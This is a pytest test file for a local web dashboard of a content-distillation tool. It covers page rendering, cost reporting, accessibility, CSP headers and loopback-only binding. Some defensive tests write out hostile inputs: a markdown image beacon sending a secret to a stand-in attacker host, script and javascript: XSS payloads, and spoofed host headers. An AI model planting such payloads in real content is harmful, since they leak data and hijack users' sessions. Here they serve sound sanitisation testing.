import json
from datetime import datetime
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient

from distill.library import Library
from distill.web.routes.channels import _collect_videos
from distill.web.server import create_app, run_server


def test_markdown_filter_strips_img_beacons(config):
    # Exfiltration guard: an injected markdown image must not survive into the
    # rendered HTML (it would auto-load as a zero-click beacon on page view).
    app = create_app(config)
    md = app.state.templates.env.filters["markdown"]
    out = md("Lead text ![x](https://attacker.test/leak?d=secret) trailing text")
    assert "<img" not in out
    assert "attacker.test" not in out
    assert "Lead text" in out and "trailing text" in out


def test_create_app_registers_routes_and_filters(config):
    app = create_app(config)

    assert app.state.config is config
    assert "markdown" in app.state.templates.env.filters
    paths = {route.path for route in app.routes}
    assert "/" in paths
    assert "/topics" in paths
    assert "/watchlist" in paths
    assert "/costs" in paths


def test_web_routes_render_dashboard_topic_channel_video_and_watchlist(config):
    lib = Library(config)
    lib.add_channel("ai", "https://www.youtube.com/@TestChannel", "TestChannel")
    lib.add_to_topic_watchlist("ai-daily", "AI daily", topic="ai")

    video_dir = config.video_dir("ai", "TestChannel", "vid001")
    video_dir.mkdir(parents=True, exist_ok=True)
    (video_dir / "metadata.json").write_text(
        json.dumps({"title": "Test Video", "upload_date": "20260401"}),
        encoding="utf-8",
    )
    (video_dir / "transcript.txt").write_text("Transcript", encoding="utf-8")
    (video_dir / "insights.md").write_text("# Insight", encoding="utf-8")

    channel_dir = config.channel_dir("ai", "TestChannel")
    (channel_dir / "synthesis.md").write_text("# Channel Synthesis", encoding="utf-8")
    (channel_dir / "channel_context.md").write_text("Channel context", encoding="utf-8")

    topic_dir = config.topic_dir("ai")
    topic_dir.mkdir(parents=True, exist_ok=True)
    (topic_dir / "topic_synthesis.md").write_text("# Topic Synthesis", encoding="utf-8")
    (topic_dir / "brief.md").write_text("# Brief", encoding="utf-8")

    site_page_dir = config.sites_dir("ai") / "example.com" / "pages" / "page-1"
    site_page_dir.mkdir(parents=True, exist_ok=True)
    (site_page_dir / "content.md").write_text("# Site Content", encoding="utf-8")

    paper_dir = config.papers_dir("ai") / "paper-1"
    paper_dir.mkdir(parents=True, exist_ok=True)
    (paper_dir / "paper.md").write_text("# Paper", encoding="utf-8")
    (paper_dir / "metadata.json").write_text(json.dumps({"title": "Paper Title"}), encoding="utf-8")

    (config.library_dir / "cost_log.jsonl").write_text(
        json.dumps(
            {
                "timestamp": "2026-04-20T12:00:00",
                "command": "learn",
                "actual_cost": 0.4,
                "metadata": {"topic": "ai", "source_type": "youtube"},
            }
        ),
        encoding="utf-8",
    )
    telemetry_file = config.library_dir / ".distill" / "telemetry.jsonl"
    telemetry_file.parent.mkdir(parents=True, exist_ok=True)
    telemetry_file.write_text(
        json.dumps(
            {
                "timestamp": "2026-04-20T12:01:00",
                "workload_tag": "report",
                "call_type": "qa",
                "model": "grok-4.3",
                "provider_name": "xai",
                "provider_type": "cloud",
                "input_tokens": 2000,
                "output_tokens": 500,
                "elapsed_seconds": 9.0,
                "outcome": "success",
            }
        )
        + "\n",
        encoding="utf-8",
    )

    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    dashboard_response = client.get("/")
    watchlist_response = client.get("/watchlist")
    topics_response = client.get("/topics")

    assert dashboard_response.status_code == 200
    assert "Distill Dashboard" in dashboard_response.text
    assert 'href="#main-content"' in dashboard_response.text
    assert 'aria-label="Primary"' in dashboard_response.text
    assert 'aria-current="page"' in dashboard_response.text
    assert 'href="/static/style.css?v=' in dashboard_response.text
    assert 'src="/static/app.js?v=' in dashboard_response.text
    assert "Simple tab switching" not in dashboard_response.text
    assert "Build your first corpus" not in dashboard_response.text
    assert '"allowEval": false' in dashboard_response.text
    assert '"allowScriptTags": false' in dashboard_response.text
    assert "ai-daily" in watchlist_response.text
    assert "ai" in topics_response.text
    topic_html = client.get("/topics/ai").text
    assert "Topic Synthesis" in topic_html
    assert "Paper Title" in topic_html
    assert 'role="tablist"' in topic_html
    assert 'role="tab"' in topic_html
    assert 'aria-selected="true"' in topic_html
    assert 'role="tabpanel"' in topic_html
    assert 'aria-labelledby="topic-tab-channels"' in topic_html

    channel_html = client.get("/topics/ai/channels/TestChannel").text
    assert "Channel Synthesis" in channel_html
    assert "Test Video" in channel_html
    assert '<caption class="sr-only">Videos in TestChannel</caption>' in channel_html
    assert '<th scope="col">Title</th>' in channel_html

    video_html = client.get("/topics/ai/channels/TestChannel/videos/vid001").text
    assert "Transcript" in video_html
    assert "Insight" in video_html
    assert 'aria-controls="tab-transcript"' in video_html
    assert 'aria-labelledby="video-tab-transcript"' in video_html

    costs_html = client.get("/costs").text
    assert "$0.40" in costs_html or "0.4" in costs_html
    assert "Biggest Prompts" in costs_html
    assert "report" in costs_html
    assert "2,500" in costs_html
    assert '<caption class="sr-only">Recent costed runs</caption>' in costs_html
    assert '<th scope="col">Command</th>' in costs_html


def test_video_detail_survives_corrupt_local_files(config):
    lib = Library(config)
    lib.add_channel("ai", "https://www.youtube.com/@TestChannel", "TestChannel")
    video_dir = config.video_dir("ai", "TestChannel", "broken")
    video_dir.mkdir(parents=True, exist_ok=True)
    (video_dir / "metadata.json").write_text("[]", encoding="utf-8")
    (video_dir / "insights.md").write_bytes(b"\xff\xfe")
    (video_dir / "transcript.txt").write_bytes(b"\xff\xfe")
    paper_dir = config.papers_dir("ai") / "paper-1"
    paper_dir.mkdir(parents=True, exist_ok=True)
    (paper_dir / "paper.md").write_text("# Paper", encoding="utf-8")
    (paper_dir / "metadata.json").write_text("{not-json", encoding="utf-8")

    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    video = client.get("/topics/ai/channels/TestChannel/videos/broken")
    topic = client.get("/topics/ai")
    channel = client.get("/topics/ai/channels/TestChannel")

    assert video.status_code == 200
    assert topic.status_code == 200
    assert channel.status_code == 200


def test_empty_dashboard_offers_a_truthful_first_action(config):
    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    response = client.get("/")

    assert response.status_code == 200
    assert "Build your first corpus" in response.text
    assert "distill --cost-mode no-metered init" in response.text
    assert "distill --cost-mode no-metered doctor" in response.text
    assert "distill --cost-mode no-metered papers" in response.text
    assert "distill --cost-mode paid-ok init" in response.text
    assert "No immediate issues detected" not in response.text
    assert 'class="metrics"' not in response.text
    assert 'id="dashboard-content"' in response.text
    assert 'hx-trigger="every 60s"' in response.text


def test_empty_topics_page_offers_setup_first_path(config):
    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    response = client.get("/topics")

    assert response.status_code == 200
    assert "No topics yet" in response.text
    assert "distill --cost-mode no-metered init" in response.text
    assert "distill --cost-mode no-metered doctor" in response.text
    assert "distill --cost-mode no-metered papers" in response.text
    assert "distill --cost-mode no-metered latest" in response.text
    assert "distill channel" not in response.text
    assert "--preview" in response.text


def test_empty_costs_page_offers_operator_guidance(config):
    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    response = client.get("/costs")

    assert response.status_code == 200
    assert "No spend recorded yet" in response.text
    assert "cost_log.jsonl" in response.text
    assert "telemetry.jsonl" in response.text
    assert str(config.library_dir / ".distill" / "cost_log.jsonl") in response.text
    assert str(config.library_dir / ".distill" / "telemetry.jsonl") in response.text
    assert "distill costs" in response.text
    assert "no-metered" in response.text
    assert "By Topic (30d)" not in response.text


def test_costs_page_fails_soft_on_corrupt_provider_telemetry(config, caplog):
    telemetry = config.library_dir / ".distill" / "telemetry.jsonl"
    telemetry.parent.mkdir(parents=True, exist_ok=True)
    telemetry.write_bytes(b"[]\n\xff\n")
    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    with caplog.at_level("DEBUG", logger="distill.llm.telemetry"):
        response = client.get("/costs")

    assert response.status_code == 200
    assert "No spend recorded yet" in response.text
    assert "Skipped 2 malformed provider telemetry rows" in caplog.text


def test_costs_page_exposes_incomplete_ledger_without_partial_rollups(config):
    log = config.library_dir / "cost_log.jsonl"
    log.parent.mkdir(parents=True, exist_ok=True)
    log.write_text(
        '{"timestamp":"2026-07-18T10:00:00","actual_cost":7,'
        '"metadata":{"topic":"ai","source_type":"youtube"}}\nnot-json\n',
        encoding="utf-8",
    )
    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    response = client.get("/costs")

    assert response.status_code == 200
    assert "Cost history is incomplete" in response.text
    assert str(log) in response.text
    assert "1 malformed row" in response.text
    assert "Total spend" not in response.text
    assert "By Topic (30d)" not in response.text
    assert "By Source (30d)" not in response.text
    assert "Recent Runs" in response.text
    assert 'role="status"' in response.text


def test_costs_page_exposes_unrepresentable_total_without_partial_rollups(config):
    log = config.library_dir / "cost_log.jsonl"
    log.parent.mkdir(parents=True, exist_ok=True)
    timestamp = datetime.now().isoformat()
    log.write_text(
        "\n".join(
            json.dumps(
                {
                    "timestamp": timestamp,
                    "actual_cost": 1e308,
                    "metadata": {"topic": "ai", "source_type": "report"},
                }
            )
            for _ in range(2)
        ),
        encoding="utf-8",
    )
    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    response = client.get("/costs")

    assert response.status_code == 200
    assert "Cost total is unavailable" in response.text
    assert "supported aggregate range" in response.text
    assert "Total spend" not in response.text
    assert "By Topic (30d)" not in response.text
    assert "By Source (30d)" not in response.text
    assert "Infinity" not in response.text


def test_empty_watchlist_page_offers_recurring_setup_path(config):
    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    response = client.get("/watchlist")

    assert response.status_code == 200
    assert "No watches configured" in response.text
    assert "distill monitor" in response.text
    assert "distill topic-watch add" in response.text
    assert "distill watch add" in response.text
    assert "does not schedule runs itself" in response.text
    assert "Channel Watches" not in response.text


def test_dashboard_styles_include_narrow_screen_and_focus_support(config):
    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    response = client.get("/static/style.css")

    assert response.status_code == 200
    assert "@media (max-width: 760px)" in response.text
    assert ".skip-link:focus" in response.text
    assert ":focus-visible" in response.text
    assert ".sr-only" in response.text


def test_dashboard_tab_controller_is_local_and_keyboard_accessible(config):
    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    response = client.get("/static/app.js")

    assert response.status_code == 200
    assert "ArrowRight" in response.text
    assert "ArrowLeft" in response.text
    assert "Home" in response.text
    assert "End" in response.text
    assert "aria-selected" in response.text
    assert "tabindex" in response.text


def test_dashboard_security_headers_disallow_inline_scripts(config):
    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    response = client.get("/")
    csp = response.headers["content-security-policy"]

    assert "script-src 'self';" in csp
    assert "script-src 'self' 'unsafe-inline'" not in csp
    assert "style-src 'self' 'unsafe-inline'" in csp
    assert "object-src 'none'" in csp
    assert "frame-ancestors 'none'" in csp


@pytest.mark.parametrize(
    "host",
    [
        "localhost",
        "localhost:8899",
        "127.0.0.1",
        "127.0.0.1:8899",
        "127.0.0.2:8899",
        "[::1]",
        "[::1]:8899",
    ],
)
def test_dashboard_accepts_literal_loopback_host_forms(config, host):
    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    response = client.get("/", headers={"host": host})

    assert response.status_code == 200


@pytest.mark.parametrize(
    "host",
    [
        "attacker.example:8899",
        "localhost.attacker.example:8899",
        "localhost:invalid",
        "localhost:",
        "localhost:" + "9" * 5000,
        "[::1]attacker:8899",
        "[::1]:",
        "::1",
        "",
    ],
)
def test_dashboard_rejects_non_loopback_or_malformed_host_headers(config, host):
    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    response = client.get("/", headers={"host": host})

    assert response.status_code == 400
    assert response.text == "Invalid host header"


def test_create_app_fallback_markdown_filter_and_run_server(monkeypatch, config):
    import builtins

    real_import = builtins.__import__

    def fake_import(name, *args, **kwargs):
        if name == "markdown":
            raise ImportError("missing markdown")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", fake_import)
    app = create_app(config)
    fallback_html = app.state.templates.env.filters["markdown"]("<tag>")
    assert fallback_html == "<pre>&lt;tag&gt;</pre>"

    opened = []
    started = []
    monkeypatch.setattr("distill.web.server.create_app", lambda cfg: SimpleNamespace(name="app"))
    monkeypatch.setattr("distill.web.server.webbrowser.open", lambda url: opened.append(url))

    class FakeTimer:
        def __init__(self, _delay, callback):
            self.callback = callback

        def start(self):
            self.callback()

    monkeypatch.setattr("distill.web.server.threading.Timer", FakeTimer)
    monkeypatch.setattr(
        "distill.web.server.uvicorn.run",
        lambda app, host, port, log_level: started.append((app, host, port, log_level)),
    )

    run_server(config, "127.0.0.1", 8899, open_browser=True)

    assert opened == ["http://127.0.0.1:8899"]
    assert started == [(SimpleNamespace(name="app"), "127.0.0.1", 8899, "warning")]


@pytest.mark.parametrize("host", ["::1", "[::1]"])
def test_run_server_normalizes_ipv6_loopback_for_bind_and_browser(monkeypatch, config, host):
    opened = []
    started = []
    monkeypatch.setattr("distill.web.server.create_app", lambda cfg: SimpleNamespace(name="app"))
    monkeypatch.setattr("distill.web.server.webbrowser.open", lambda url: opened.append(url))

    class FakeTimer:
        def __init__(self, _delay, callback):
            self.callback = callback

        def start(self):
            self.callback()

    monkeypatch.setattr("distill.web.server.threading.Timer", FakeTimer)
    monkeypatch.setattr(
        "distill.web.server.uvicorn.run",
        lambda app, host, port, log_level: started.append((app, host, port, log_level)),
    )

    run_server(config, host, 8899, open_browser=True)

    assert opened == ["http://[::1]:8899"]
    assert started == [(SimpleNamespace(name="app"), "::1", 8899, "warning")]


@pytest.mark.parametrize("host", ["0.0.0.0", "::", "192.168.1.20", "dashboard.example"])
def test_run_server_rejects_non_loopback_bindings(monkeypatch, config, host):
    monkeypatch.setattr(
        "distill.web.server.create_app",
        lambda _config: pytest.fail("app must not be created for an unsafe bind"),
    )

    with pytest.raises(ValueError, match="loopback"):
        run_server(config, host, 8899, open_browser=False)


@pytest.mark.parametrize("port", [True, 0, -1, 65_536, 10**4_000])
def test_run_server_rejects_invalid_ports_before_creating_app(monkeypatch, config, port):
    monkeypatch.setattr(
        "distill.web.server.create_app",
        lambda _config: pytest.fail("app must not be created for an invalid port"),
    )

    with pytest.raises(ValueError, match="port must be an integer between 1 and 65535"):
        run_server(config, "127.0.0.1", port, open_browser=False)


def test_channel_video_collection_handles_missing_and_invalid_metadata(tmp_path):
    from distill.config import DistillConfig

    config = DistillConfig(distill_output_dir=tmp_path / "lib")
    assert _collect_videos(config, "ai", "Creator") == []

    videos_dir = config.videos_dir("ai", "Creator")
    videos_dir.mkdir(parents=True, exist_ok=True)
    (videos_dir / "note.txt").write_text("ignore", encoding="utf-8")
    (videos_dir / "video-no-meta").mkdir()
    broken_dir = videos_dir / "video-bad-meta"
    broken_dir.mkdir()
    (broken_dir / "metadata.json").write_text("{bad json", encoding="utf-8")

    assert _collect_videos(config, "ai", "Creator") == []


def test_dashboard_route_falls_back_to_dev_version(monkeypatch, config):
    import importlib.metadata

    monkeypatch.setattr(
        importlib.metadata, "version", lambda _name: (_ for _ in ()).throw(RuntimeError("boom"))
    )

    client = TestClient(create_app(config), base_url="http://127.0.0.1:8899")

    response = client.get("/")
    assert response.status_code == 200
    assert "dev" in response.text


def test_markdown_filter_sanitizes_untrusted_html(config):
    # Artifact bodies come from untrusted sources; the dashboard renders them as
    # |markdown|safe, so the filter must strip active HTML to avoid stored XSS.
    app = create_app(config)
    md = app.state.templates.env.filters["markdown"]
    out = md("# Title\n\n<script>alert(1)</script>\n\n[x](javascript:alert(1))\n\n**bold**")
    assert "<script" not in out
    assert "javascript:" not in out
    assert "<strong>" in out  # legitimate markdown still rendered
